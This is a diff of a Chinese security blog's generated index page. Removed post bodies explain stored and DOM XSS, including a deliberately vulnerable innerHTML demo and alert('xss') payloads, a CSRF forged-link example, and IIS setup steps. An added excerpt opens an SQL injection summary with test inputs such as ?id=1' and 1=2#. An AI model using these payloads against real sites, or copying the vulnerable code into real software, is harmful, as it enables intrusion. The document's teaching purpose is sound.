-<p>  存储型xss，又称为持久型跨站点脚本，它一般发生在XSS攻击向量(一般指XSS攻击代码)存储在网站数据库，当一个页面被用户打开的时候执行。每当用户打开浏览器,脚本执行。持久的XSS相比非持久性XSS攻击危害性更大,因为每当用户打开页面，查看内容时脚本将自动执行。</p>
-<hr>
-<p>存储型 XSS 的数据流向是：浏览器 -&gt; 后端 -&gt; 数据库 -&gt; 后端 -&gt; 浏览器。</p>
-<h3 id="3-3-DOM型xss"><a href="#3-3-DOM型xss" class="headerlink" title="3.3 DOM型xss"></a>3.3 DOM型xss</h3><p> 部分代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> &lt;div class=&quot;page-content&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div id=&quot;xssd_main&quot;&gt;</span><br><span class="line">        &lt;script&gt;</span><br><span class="line">            function domxss()&#123;</span><br><span class="line">                var str = document.getElementById(&quot;text&quot;).value;</span><br><span class="line">                document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&apos;&quot;+str+&quot;&apos;&gt;what do you see?&lt;/a&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            //试试：&apos;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&apos;xss&apos;)&quot;&gt;</span><br><span class="line">            //试试：&apos; onclick=&quot;alert(&apos;xss&apos;)&quot;&gt;,闭合掉就行</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">        &lt;!--&lt;a href=&quot;&quot; onclick=(&apos;xss&apos;)&gt;--&gt;</span><br><span class="line">        &lt;input id=&quot;text&quot; name=&quot;text&quot; type=&quot;text&quot;  value=&quot;&quot; /&gt;</span><br><span class="line">        &lt;input id=&quot;button&quot; type=&quot;button&quot; value=&quot;click me!&quot; onclick=&quot;domxss()&quot; /&gt;</span><br><span class="line">        &lt;div id=&quot;dom&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;&lt;!-- /.page-content --&gt;</span><br></pre></td></tr></table></figure></p>
-<p>直接利用dom方法:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var str = document.getElementById(&quot;text&quot;).value;</span><br><span class="line">document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&apos;&quot;+str+&quot;&apos;&gt;what do you see?&lt;/a&gt;&quot;;</span><br></pre></td></tr></table></figure></p>
-<p>创建JS把前端输入直接输出到前端。<br>即数据流向是从URL-&gt;浏览器。</p>
-<p><strong>payload</strong><br>‘ onclick=”alert(‘xss’)”&gt;把a标签的href属性闭合掉就行</p>
-<hr>
-<h3 id="4-xss攻击实例-amp-利用"><a href="#4-xss攻击实例-amp-利用" class="headerlink" title="4 xss攻击实例&amp;利用"></a>4 xss攻击实例&amp;利用</h3>
+          Sql注入总结sql注入类型联合查询1、利用闭合变量报错测试注入点， ?id=1’这样说明存在单引号闭合注入2、是否存在注入点，用and语句测试?id=1’ and 1=2# ?id=1’ and 1=1#3、猜测字段?id=1’ order by 3%234、找到页面中数据输入点 ?id=-1’ 
+          ...
+          <!--noindex-->
           
-        
-      
-    </div>
-    <div>
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    <div>
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/11/22/Sql注入总结/" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
           
-    </div>
-    
-
-    
-       
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://bleaner.club/2019/07/03/CSRF跨站请求伪造/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="y gao">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/pikachuu_Alex.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="bleaner">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/07/03/CSRF跨站请求伪造/" class="post-title-link" itemprop="http://bleaner.club/index.html">CSRF跨站请求伪造</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Veröffentlicht am</span>
-              
-
-              
-                
-              
-
-              <time title="Post created: 2019-07-03 15:17:09" itemprop="dateCreated datePublished" datetime="2019-07-03T15:17:09+08:00">2019-07-03</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Updated at: 2019-11-17 00:36:31" itemprop="dateModified" datetime="2019-11-17T00:36:31+08:00">2019-11-17</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">in</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Web安全漏洞/" itemprop="url" rel="index"><span itemprop="name">Web安全漏洞</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2019/07/03/CSRF跨站请求伪造/#comments" itemprop="discussionUrl">
-                  <span class="post-meta-item-text">Comments: </span> <span class="post-comments-count valine-comment-count" data-xid="/2019/07/03/CSRF跨站请求伪造/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2019/07/03/CSRF跨站请求伪造/" class="leancloud_visitors" data-flag-title="CSRF跨站请求伪造">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">Views: </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="CSRF跨站请求伪造"><a href="#CSRF跨站请求伪造" class="headerlink" title="CSRF跨站请求伪造"></a>CSRF跨站请求伪造</h3><h4 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h4><p>Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。<br>举个栗子：<br>    场景需求：<br>    小黑想要修改大白在购物网站tianxie<a href="http://www.xx.com上填写的会员地址。" target="_blank" rel="noopener">www.xx.com上填写的会员地址。</a><br>    先看下大白是如何修改自己的密码的：<br>    登录—修改会员信息，提交请求—修改成功。<br>    所以小黑想要修改大白的信息，他需要拥有：<br>    1，登录权限 2，修改个人信息的请求。<br>    但是大白又不会把自己xxx网站的账号密码告诉小黑，那小黑怎么办？<br>    于是他自己跑到<a href="http://www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：" target="_blank" rel="noopener">www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：</a><br>    【<a href="http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change】" target="_blank" rel="noopener">http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change】</a><br>    于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录xxx网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了,小黑就完成了攻击目的。<br>    为啥小黑的操作能够实现呢。有如下几个关键点：<br>    1.<a href="http://www.xxx.com这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造" target="_blank" rel="noopener">www.xxx.com这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造</a>;<br>    —因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。<br>    2.小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上;<br>    —如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。<br>    —因此，要成功实施一次CSRF攻击，需要“天时，地利，人和”的条件。<br>    当然，如果小黑事先在xxx网的首页如果发现了一个XSS漏洞，则小黑可能会这样做： 欺骗小白访问埋伏了XSS脚本（盗取cookie的脚本）的页面，小白中招，小黑拿到小白的cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。</p>
-<h4 id="2-CSRF和XSS的区别"><a href="#2-CSRF和XSS的区别" class="headerlink" title="2.CSRF和XSS的区别"></a>2.CSRF和XSS的区别</h4><p>CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。<br>    因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：<br>    –对敏感信息的操作增加安全的token；<br>    –对敏感信息的操作增加安全的验证码；<br>    –对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</p>
-
-          
+          <!--/noindex-->
         
       
     </div>
@@ -1252,12 +654,12 @@
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="y gao">
-      <meta itemprop="description" content="">
+      <meta itemprop="description" content="次は现実世界で会おう <br/> そしたらまた <br/> 同じように友だちになれるよ。">
       <meta itemprop="image" content="/images/pikachuu_Alex.jpg">
     </span>
 
     <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="bleaner">
+      <meta itemprop="name" content="热爱 | bleaner">
     </span>
 
     
@@ -1310,7 +712,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Updated at: 2019-11-17 00:36:51" itemprop="dateModified" datetime="2019-11-17T00:36:51+08:00">2019-11-17</time>
+                <time title="Updated at: 2020-03-16 22:38:11" itemprop="dateModified" datetime="2020-03-16T22:38:11+08:00">2020-03-16</time>
               
             
           </span>
@@ -1384,15 +786,433 @@
       
         
           
-            <h3 id="windows环境下搭建网站"><a href="#windows环境下搭建网站" class="headerlink" title="windows环境下搭建网站"></a>windows环境下搭建网站</h3><hr>
-<h4 id="IIS服务的安装"><a href="#IIS服务的安装" class="headerlink" title="IIS服务的安装"></a>IIS服务的安装</h4><p>1.打开“控制面板” - “程序” - “启动或关闭Windows功能<br><img src="./1558889013966.png" alt="Alt text"></p>
-<h4 id="IIS配置"><a href="#IIS配置" class="headerlink" title="IIS配置"></a>IIS配置</h4><p>1.WIN + X  -  “计算机管理”<br>2.新建网站<br><img src="./1558889387125.png" alt="Alt text"><br><img src="./1558889414696.png" alt="Alt text"><br>完成以上设置之后，尝试在自己的电脑上浏览（假设我以上端口号设置为81，即在浏览器输入localhost:81 或者127.0.0.1:81或者输入自己当前网卡的IP地址+端口号81）<br><img src="./1558889620579.png" alt="Alt text"><br>或者输入目前电脑的IP地址（局域网地址）<br>cmd - ipconfig:<br><img src="./1558889685198.png" alt="Alt text"><br>这样我们就在自己的Windows上搭建了一个网站</p>
-<h4 id="防火墙配置"><a href="#防火墙配置" class="headerlink" title="防火墙配置"></a>防火墙配置</h4><p>目前我们电脑开启IIS服务，就相当于一台具有IIS服务的web服务器，我们要保证其他机器能够访问我们的网站，就必须考虑防火墙的问题。<br>防火墙和网络保护 - 高级设置<br><img src="./1558890205394.png" alt="Alt text"><br><img src="./1558890249570.png" alt="Alt text"></p>
-<p>我们可以直接关闭防火墙，但是这是很不安全的措施<br>我们可以通过设置防火墙的出入站规则（ACL），对网站访问权限进行设置<br>入站规则：新建入站规则，选择对端口进行设置，我们可以设置为允许任何对于81端口的请求。<br> 入站规则 - 新建规则 - 端口<br> <img src="./1558890386936.png" alt="Alt text"><br> <img src="./1558890418634.png" alt="Alt text"><br> <img src="./1558890487914.png" alt="Alt text"><br><img src="./1558890502509.png" alt="Alt text"><br> <img src="./1558890440915.png" alt="Alt text"><br>完成<br><img src="w./1558890531222.png" alt="Alt text"></p>
-<hr>
-<p>这样在同一局域网下的主机便可以访问我们的网站啦</p>
+          windows环境下搭建网站
+IIS服务的安装1.打开“控制面板” - “程序” - “启动或关闭Windows功能
+IIS配置1.WIN + X  -  “计算机管理”2.新建网站完成以上设置之后，尝试在自己的电脑上浏览（假设我以上端口号设置为81，即在浏览器输入localhost:81 或者12
+          ...
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/05/27/windows环境下搭建网站/" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+    <div>
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    <div>
+          
+    </div>
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://bleaner.club/2019/01/06/CSRF跨站请求伪造/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="y gao">
+      <meta itemprop="description" content="次は现実世界で会おう <br/> そしたらまた <br/> 同じように友だちになれるよ。">
+      <meta itemprop="image" content="/images/pikachuu_Alex.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="热爱 | bleaner">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/01/06/CSRF跨站请求伪造/" class="post-title-link" itemprop="http://bleaner.club/index.html">CSRF跨站请求伪造</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2019-01-06 00:00:00" itemprop="dateCreated datePublished" datetime="2019-01-06T00:00:00+08:00">2019-01-06</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Updated at: 2020-03-16 22:37:41" itemprop="dateModified" datetime="2020-03-16T22:37:41+08:00">2020-03-16</time>
+              
+            
+          </span>
 
           
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/知识总结/" itemprop="url" rel="index"><span itemprop="name">知识总结</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/01/06/CSRF跨站请求伪造/#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">Comments: </span> <span class="post-comments-count valine-comment-count" data-xid="/2019/01/06/CSRF跨站请求伪造/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2019/01/06/CSRF跨站请求伪造/" class="leancloud_visitors" data-flag-title="CSRF跨站请求伪造">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Views: </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+          CSRF跨站请求伪造1.概述Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。举个栗子：
+          ...
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/01/06/CSRF跨站请求伪造/" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+    <div>
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    <div>
+          
+    </div>
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://bleaner.club/2019/01/06/xss跨站脚本攻击/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="y gao">
+      <meta itemprop="description" content="次は现実世界で会おう <br/> そしたらまた <br/> 同じように友だちになれるよ。">
+      <meta itemprop="image" content="/images/pikachuu_Alex.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="热爱 | bleaner">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/01/06/xss跨站脚本攻击/" class="post-title-link" itemprop="http://bleaner.club/index.html">xss跨站脚本攻击</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2019-01-06 00:00:00" itemprop="dateCreated datePublished" datetime="2019-01-06T00:00:00+08:00">2019-01-06</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Updated at: 2020-03-16 22:37:47" itemprop="dateModified" datetime="2020-03-16T22:37:47+08:00">2020-03-16</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/知识总结/" itemprop="url" rel="index"><span itemprop="name">知识总结</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/01/06/xss跨站脚本攻击/#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">Comments: </span> <span class="post-comments-count valine-comment-count" data-xid="/2019/01/06/xss跨站脚本攻击/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2019/01/06/xss跨站脚本攻击/" class="leancloud_visitors" data-flag-title="xss跨站脚本攻击">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Views: </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+          xss跨站脚本攻击1.简介跨站脚本（cross site script）为了避免与样式css混淆，所以简称为XSS。XSS是一种经常出现在web应用中的计算机安全漏洞，也是web中最主流的攻击方式。那么什么是XSS呢？XSS是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而
+          ...
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/01/06/xss跨站脚本攻击/" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -1475,7 +1295,7 @@
             </a>
             
               <p class="site-author-name" itemprop="name">y gao</p>
-              <p class="site-description motion-element" itemprop="description"></p>
+              <p class="site-description motion-element" itemprop="description">次は现実世界で会おう <br> そしたらまた <br> 同じように友だちになれるよ。</p>
           </div>
 
           
@@ -1485,7 +1305,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">5</span>
+                    <span class="site-state-item-count">4</span>
                     <span class="site-state-item-name">Artikel</span>
                   </a>
                 </div>
@@ -1527,6 +1347,13 @@
             </nav>
           
 
+          
+            <div class="feed-link motion-element">
+              <a href="/./atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
           
 
           
@@ -1688,6 +1515,14 @@
   
 
 
+
+  
+    
+      
+        
+      
+  
+  <script type="text/javascript" color="0,0,255" opacity="0.5" zindex="-1" count="99" src="true"></script>
 
 
 
@@ -2198,8 +2033,6 @@
 
   
   
-    
-      
     
       
     
